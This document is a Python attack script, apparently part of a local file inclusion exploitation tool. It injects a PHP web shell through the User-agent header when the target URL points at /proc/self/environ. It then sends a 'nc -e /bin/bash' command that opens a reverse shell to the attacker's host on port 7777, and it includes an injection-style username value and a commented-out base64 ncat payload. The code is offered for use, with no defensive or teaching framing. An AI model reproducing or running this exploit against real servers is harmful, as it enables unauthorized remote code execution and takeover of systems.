#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess
import base64


class Shell_conncet:

     def __init__(self):
        self.control()
        if "proc/self/environ" in self.url:                                                                                                          
                      #  netcatshell = "ncat -e /bin/bash/ ".replace("\n","")+str(self.args.shell).replace('\n','')+' 7777'.replace('\n','')
                       # Shell64 = str(base64.b64encode(netcatshell.encode())).replace("b'",'')
                        #self.payloadPHP = "<?php passthur(base64_decode('"+Shell64+"));?>"
            self.paylaodPHP = "<?php system($_GET['cmd']); ?>"
            command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '   
            request = mechanize.Browser()
            request.set_handle_robots(False)
            request.set_handle_redirect(True)
            request.set_handle_refresh(True, max_time=1)  
            if "proc/self/environ" in self.url:
                request.addheaders = [('User-agent', 'Mozilla/5.0'+self.paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
                                    Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                    ('Cookie',str(self.Cookie).replace('\n','')),
                                    ('username',"admin'#"),
                                    ('password','password')]
                path   =  "python " +str(os.getcwd())+'/Package/shell/netcat.py'
                run    = ' gnome-terminal  -e '+'" '+path+' "' 
                xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE) 
                try:
                    first_req = request.open(self.url).read()  
                    time.sleep(4) 
                    self.Get_Oregnal_URL = request.open(command).read()
                    exit()
                except Exception  as e :
                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                         print("[*] Error : ",e )
                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                         print("[*] Follow url Format ")
                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
                         exit()
                except KeyboardInterrupt:
                     exit()
     def control(self): 
           parser = argparse.ArgumentParser(description="Usage: [OPtion] [arguments] [ -w ] [arguments]") 
           parser.add_argument("-UV ","--Vulnurl"     , action=None         ,required=True     ) 
           parser.add_argument("--auth"               , action='store_true'                    ) 
           parser.add_argument("-F","--filelist"      , action=None                            )
           parser.add_argument("-C","--Cookie"        , action=None          ,required=True    )  
           parser.add_argument("-B64","--base64"      , action='store_true'                    )  
           parser.add_argument("-R","--read"          , action=None                            )  
           parser.add_argument("-UF ","--UserForm"    , action=None                            )
           parser.add_argument("-PF ","--PassForm"    , action=None                            )
           parser.add_argument("-P  ","--password"    , action=None                            )   
           parser.add_argument("-LU  ","--loginurl"   , action=None                            ) 
           parser.add_argument("-U  ","--user"        , action=None                            )
           parser.add_argument( "-S", "--shell"       , action=None                            )
           self.args = parser.parse_args()
           if len(sys.argv)!=1 :
              pass
           else:
              parser.print_help() 
              exit()
if __name__=='__main__':
   Shell_conncet() 
